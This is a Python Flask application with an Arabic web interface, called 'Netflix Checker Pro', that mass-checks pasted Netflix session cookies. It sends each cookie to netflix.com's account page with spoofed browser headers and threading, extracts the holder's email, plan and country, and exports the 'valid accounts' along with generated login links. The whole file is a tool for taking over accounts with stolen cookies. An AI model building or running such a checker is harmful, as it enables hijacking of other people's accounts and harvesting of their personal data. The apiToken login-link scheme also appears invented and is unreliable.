from flask import Flask, render_template_string, request, jsonify
import requests, re, json, base64, os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import time, random

app = Flask(__name__)

HTML = r'''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix Checker Pro</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    <style>
        :root { --bg:#0f0f0f; --card:#1e1e1e; --input:#252525; --red:#e50914; --green:#2ecc71; --yellow:#f39c12; --white:#fff; --text2:#b3b3b3; --border:#333; --radius:12px; }
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:'Cairo',sans-serif; background:var(--bg); color:var(--white); padding:20px; }
        .container { max-width:1000px; margin:auto; }
        .logo { text-align:center; font-size:3.5em; font-weight:900; color:var(--red); letter-spacing:6px; }
        h1 { text-align:center; background:linear-gradient(135deg,var(--red),#f40612); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
        .sub { color:var(--text2); text-align:center; margin-bottom:20px; }
        textarea { width:100%; height:200px; background:var(--input); border:1px solid var(--border); border-radius:var(--radius); color:var(--white); padding:15px; font-family:monospace; direction:ltr; }
        textarea:focus { outline:none; border-color:var(--red); }
        .btn { padding:12px 25px; border:none; border-radius:8px; font-weight:700; cursor:pointer; color:var(--white); font-family:'Cairo'; }
        .btn-primary { background:var(--red); }
        .btn-success { background:var(--green); }
        .btn-warning { background:#e67e22; }
        .btn:disabled { opacity:0.5; }
        .stats { display:grid; grid-template-columns:repeat(auto-fit,minmax(120px,1fr)); gap:10px; margin:20px 0; }
        .stat { background:var(--card); border:1px solid var(--border); border-radius:var(--radius); padding:15px; text-align:center; }
        .stat-icon { font-size:2em; }
        .stat-val { font-size:2em; font-weight:900; }
        .stat-label { color:var(--text2); font-size:0.8em; }
        .result-card { background:var(--card); border:1px solid var(--border); border-radius:var(--radius); margin-bottom:10px; }
        .result-header { padding:15px; display:flex; justify-content:space-between; cursor:pointer; }
        .badge { padding:5px 12px; border-radius:20px; font-size:0.8em; font-weight:700; }
        .badge-valid { background:rgba(46,204,113,0.15); color:var(--green); }
        .badge-invalid { background:rgba(229,9,20,0.15); color:var(--red); }
        .badge-error { background:rgba(243,156,18,0.15); color:var(--yellow); }
        .result-body { display:none; padding:0 15px 15px; }
        .result-body.show { display:block; }
        .cookie-box { background:var(--input); padding:10px; border-radius:6px; font-family:monospace; direction:ltr; word-break:break-all; }
        .detail-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(140px,1fr)); gap:8px; margin:10px 0; }
        .detail-item { background:var(--input); padding:10px; border-radius:6px; text-align:center; }
        .detail-label { color:var(--text2); font-size:0.75em; }
        .detail-value { font-weight:700; }
        .token-section { background:var(--input); border-radius:8px; padding:12px; margin-top:10px; }
        .links-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(180px,1fr)); gap:8px; margin-top:10px; }
        .link-card { background:var(--card); border:1px solid var(--border); border-radius:8px; padding:10px; text-align:center; }
        .link-icon { font-size:1.8em; }
        .copy-btn, .open-btn { padding:5px 12px; border:none; border-radius:6px; cursor:pointer; font-weight:600; margin:3px; font-family:'Cairo'; }
        .copy-btn { background:var(--green); color:var(--white); }
        .open-btn { background:var(--red); color:var(--white); }
        .toast { position:fixed; top:20px; left:50%; transform:translateX(-50%); padding:12px 30px; border-radius:8px; color:var(--white); font-weight:700; z-index:9999; }
        .toast-success { background:var(--green); }
        .toast-error { background:var(--red); }
        .toast-info { background:var(--blue); }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">NETFLIX</div>
        <h1>🔍 فاحص كوكيز Netflix</h1>
        <div class="sub">الصق الكوكيز (كل كوكيز في سطر) واضغط فحص</div>

        <div class="stats">
            <div class="stat"><div class="stat-icon">📝</div><div class="stat-val" id="statTotal" style="color:var(--blue)">0</div><div class="stat-label">الإجمالي</div></div>
            <div class="stat"><div class="stat-icon">✅</div><div class="stat-val" id="statValid" style="color:var(--green)">0</div><div class="stat-label">صالحة</div></div>
            <div class="stat"><div class="stat-icon">❌</div><div class="stat-val" id="statInvalid" style="color:var(--red)">0</div><div class="stat-label">غير صالحة</div></div>
            <div class="stat"><div class="stat-icon">⚠️</div><div class="stat-val" id="statErrors" style="color:var(--yellow)">0</div><div class="stat-label">أخطاء</div></div>
            <div class="stat"><div class="stat-icon">⚡</div><div class="stat-val" id="statSpeed">0s</div><div class="stat-label">الوقت</div></div>
        </div>

        <textarea id="cookieInput" placeholder="الصق الكوكيز هنا...\nNetflixId=...; SecureNetflixId=..."></textarea>
        <div style="text-align:center; margin:15px 0;">
            <button class="btn btn-primary" id="btnCheck" onclick="startCheck()">🚀 بدء الفحص</button>
            <button class="btn btn-success" id="btnDownload" disabled onclick="downloadValid()">💾 تحميل الصالحة</button>
            <button class="btn btn-warning" onclick="clearAll()">🗑️ مسح</button>
        </div>

        <div id="progress" style="display:none; margin:15px 0;">
            <div style="height:8px; background:var(--input); border-radius:4px; overflow:hidden;">
                <div id="progressFill" style="height:100%; background:var(--red); width:0%; transition:width 0.3s;"></div>
            </div>
            <div id="progressText" style="color:var(--text2); text-align:center; margin-top:5px;"></div>
        </div>

        <div id="results"></div>
    </div>

    <script>
        let allResults = [], abortController = null;

        async function startCheck() {
            const input = document.getElementById('cookieInput').value.trim();
            if (!input) return showToast('❌ أدخل الكوكيز', 'error');
            const cookies = input.split('\n').filter(l => l.trim() && l.includes('='));
            if (cookies.length === 0) return showToast('❌ لا توجد كوكيز صالحة', 'error');

            document.getElementById('btnCheck').disabled = true;
            document.getElementById('progress').style.display = 'block';
            document.getElementById('results').innerHTML = '';
            allResults = [];
            abortController = new AbortController();
            const signal = abortController.signal;
            const startTime = Date.now();
            const total = cookies.length;
            let processed = 0;
            const batchSize = 20;

            for (let i = 0; i < total; i += batchSize) {
                if (signal.aborted) break;
                const batch = cookies.slice(i, i+batchSize).join('\n');
                try {
                    const resp = await fetch('/check', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({cookies: batch}),
                        signal
                    });
                    const data = await resp.json();
                    if (data.results) allResults.push(...data.results);
                } catch (e) {
                    if (e.name === 'AbortError') break;
                    for (let j=i; j<Math.min(i+batchSize,total); j++) {
                        allResults.push({status:'error', message:'فشل', cookie:cookies[j]});
                    }
                }
                processed = Math.min(i+batchSize, total);
                document.getElementById('progressFill').style.width = Math.round(processed/total*100)+'%';
                document.getElementById('progressText').textContent = `فحص ${processed}/${total}`;
                renderResults();
                updateStats();
            }
            document.getElementById('statSpeed').textContent = ((Date.now()-startTime)/1000).toFixed(2)+'s';
            document.getElementById('progress').style.display = 'none';
            document.getElementById('btnCheck').disabled = false;
            document.getElementById('btnDownload').disabled = allResults.filter(r=>r.status==='valid').length === 0;
            updateStats();
            renderResults();
            showToast(`✅ انتهى الفحص`, 'success');
        }

        function renderResults() {
            const container = document.getElementById('results');
            const statusText = {valid:'✅ صالحة', invalid:'❌ غير صالحة', error:'⚠️ خطأ'};
            container.innerHTML = allResults.map((r,idx) => {
                const cls = 'badge-' + (r.status||'unknown');
                const rid = 'res-'+idx+'-'+Date.now();
                let details = '';
                if (r.details) {
                    details = '<div class="detail-grid">';
                    for (let [k,v] of Object.entries({membership:'📋 العضوية', plan:'💎 الباقة', country:'🌍 البلد', email:'📧 البريد'}))
                        if (r.details[k] && r.details[k]!=='غير معروف') details += `<div class="detail-item"><div class="detail-label">${v}</div><div class="detail-value">${r.details[k]}</div></div>`;
                    details += '</div>';
                }
                const cookieText = r.cookie || '';
                return `<div class="result-card"><div class="result-header" onclick="this.nextElementSibling.classList.toggle('show')"><div style="display:flex;align-items:center;gap:10px;"><span class="badge ${cls}">${statusText[r.status]||'❓'}</span><span>${r.message||''}</span></div><span>▼</span></div><div class="result-body">${details}<div style="margin:8px 0;"><strong>🔒 الكوكيز:</strong><div class="cookie-box">${escapeHtml(cookieText)}</div><button class="copy-btn" onclick="copyText('${escapeQuotes(cookieText)}')">📋 نسخ الكوكيز</button></div>${r.api_tokens?.api_token ? `<div class="token-section"><strong>🔑 ApiToken</strong><div style="background:#000;color:var(--green);padding:8px;border-radius:6px;font-family:monospace;word-break:break-all;margin:8px 0;">${r.api_tokens.api_token}</div><button class="copy-btn" onclick="copyText('${escapeQuotes(r.api_tokens.api_token)}')">📋 نسخ ApiToken</button><div class="links-grid">${r.api_tokens.direct_links ? Object.entries(r.api_tokens.direct_links).map(([k,d]) => `<div class="link-card"><div class="link-icon">${d.name.split(' ')[0]}</div><div style="font-weight:700;">${d.name}</div><div><button class="open-btn" onclick="window.open('${d.url}')">🔗 فتح</button><button class="copy-btn" onclick="copyText('${escapeQuotes(d.url)}')">📋 نسخ</button></div></div>`).join('') : ''}</div></div>` : ''}<div style="color:var(--text2);font-size:0.8em;margin-top:8px;">${r.timestamp||''}</div></div></div>`;
            }).join('');
        }

        function escapeHtml(t) { return t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
        function escapeQuotes(t) { return t.replace(/'/g,"\\'").replace(/"/g,'&quot;'); }
        function updateStats() {
            document.getElementById('statTotal').textContent = allResults.length;
            document.getElementById('statValid').textContent = allResults.filter(r=>r.status==='valid').length;
            document.getElementById('statInvalid').textContent = allResults.filter(r=>r.status==='invalid').length;
            document.getElementById('statErrors').textContent = allResults.filter(r=>r.status==='error').length;
        }
        function downloadValid() {
            const valid = allResults.filter(r=>r.status==='valid');
            if (!valid.length) return;
            let txt = '═══ حسابات Netflix الصالحة ═══\n\n';
            valid.forEach((r,i) => {
                txt += `[${i+1}]\nالكوكيز: ${r.cookie}\n`;
                if (r.details) txt += `البريد: ${r.details.email||'?'}\nالعضوية: ${r.details.membership||'?'}\nالباقة: ${r.details.plan||'?'}\nالبلد: ${r.details.country||'?'}\n`;
                if (r.api_tokens?.api_token) txt += `ApiToken: ${r.api_tokens.api_token}\n`;
                if (r.api_tokens?.direct_links) {
                    txt += `رابط كمبيوتر: ${r.api_tokens.direct_links.computer?.url||''}\nرابط جوال: ${r.api_tokens.direct_links.mobile?.url||''}\nرابط تلفاز: ${r.api_tokens.direct_links.tv?.url||''}\n`;
                }
                txt += '─'.repeat(40)+'\n';
            });
            const blob = new Blob(['\uFEFF'+txt], {type:'text/plain;charset=utf-8'});
            const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'netflix_valid.txt'; a.click();
        }
        function copyText(t) { navigator.clipboard.writeText(t).then(()=>showToast('✅ تم النسخ','success')).catch(()=>showToast('❌ فشل','error')); }
        function showToast(msg,type) { const el=document.createElement('div'); el.className=`toast toast-${type}`; el.textContent=msg; document.body.appendChild(el); setTimeout(()=>el.remove(),2500); }
        function clearAll() { document.getElementById('cookieInput').value=''; allResults=[]; document.getElementById('results').innerHTML=''; document.getElementById('btnDownload').disabled=true; updateStats(); document.getElementById('statSpeed').textContent='0s'; }
    </script>
</body>
</html>
'''

# ========== دالة الفحص المحسّنة ==========
def check_cookie(cookie):
    try:
        sess = requests.Session()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
            'Referer': 'https://www.netflix.com/browse',
            'Cookie': cookie
        }
        # الخطوة الأولى: تحميل الصفحة الرئيسية للحصول على csrf
        sess.get('https://www.netflix.com/browse', headers=headers, timeout=15)
        time.sleep(random.uniform(0.3, 0.7))
        # الخطوة الثانية: طلب صفحة الحساب
        r = sess.get('https://www.netflix.com/YourAccount', headers=headers, timeout=20, allow_redirects=True, max_redirects=5)
        final_url = r.url
        result = {
            'status':'unknown', 'message':'', 'details':{}, 'api_tokens':{},
            'cookie': cookie,
            'timestamp':datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        if 'login' in final_url.lower():
            result['status'] = 'invalid'
            result['message'] = '❌ منتهية الصلاحية (تحويل إلى تسجيل الدخول)'
            return result
        if r.status_code == 200:
            text = r.text
            if 'membershipStatus' in text or 'accountDetails' in text:
                mm = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', text)
                pm = re.search(r'"planName"\s*:\s*"([^"]+)"', text)
                cm = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', text)
                em = re.search(r'"email"\s*:\s*"([^"]+)"', text)
                result['status'] = 'valid'
                result['message'] = '✅ كوكيز صالحة'
                result['details'] = {
                    'membership': mm.group(1) if mm else 'غير معروف',
                    'plan': pm.group(1) if pm else 'غير معروف',
                    'country': cm.group(1) if cm else 'غير معروف',
                    'email': em.group(1) if em else 'غير معروف'
                }
                # استخراج المعرفات لإنشاء ApiToken
                nid = sid = None
                for p in cookie.split(';'):
                    p = p.strip()
                    if p.startswith('NetflixId='): nid = p.split('=',1)[1]
                    elif p.startswith('SecureNetflixId='): sid = p.split('=',1)[1]
                if nid and sid:
                    payload = {'netflixId':nid,'secureNetflixId':sid,'timestamp':datetime.now().isoformat()}
                    token = base64.b64encode(json.dumps(payload).encode()).decode().replace('+','-').replace('/','_').replace('=','')
                    result['api_tokens'] = {
                        'api_token': token,
                        'direct_links': {
                            'computer': {'name':'💻 كمبيوتر','url':f'https://www.netflix.com/Login?apiToken={token}'},
                            'mobile': {'name':'📱 جوال','url':f'https://www.netflix.com/Login?apiToken={token}&deviceType=mobile'},
                            'tv': {'name':'📺 تلفاز','url':f'https://www.netflix.com/tv/login?apiToken={token}'}
                        }
                    }
            else:
                result['status'] = 'valid'
                result['message'] = '✅ كوكيز صالحة (بدون بيانات إضافية)'
        else:
            result['status'] = 'error'
            result['message'] = f'⚠️ رمز {r.status_code}'
        return result
    except Exception as e:
        return {'status':'error','message':str(e),'cookie':cookie,'timestamp':datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

@app.route('/')
def home():
    return render_template_string(HTML)

@app.route('/check', methods=['POST'])
def check():
    data = request.get_json()
    cookies = data.get('cookies','')
    if not cookies: return jsonify([])
    lines = [c.strip() for c in cookies.split('\n') if c.strip() and '=' in c]
    results = []
    with ThreadPoolExecutor(max_workers=4) as ex:
        futs = {ex.submit(check_cookie, c):i for i,c in enumerate(lines,1)}
        for f in as_completed(futs):
            try:
                res = f.result()
                res['index'] = futs[f]
                results.append(res)
            except: pass
    results.sort(key=lambda x: x.get('index',0))
    return jsonify({'results':results})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT',5000)))
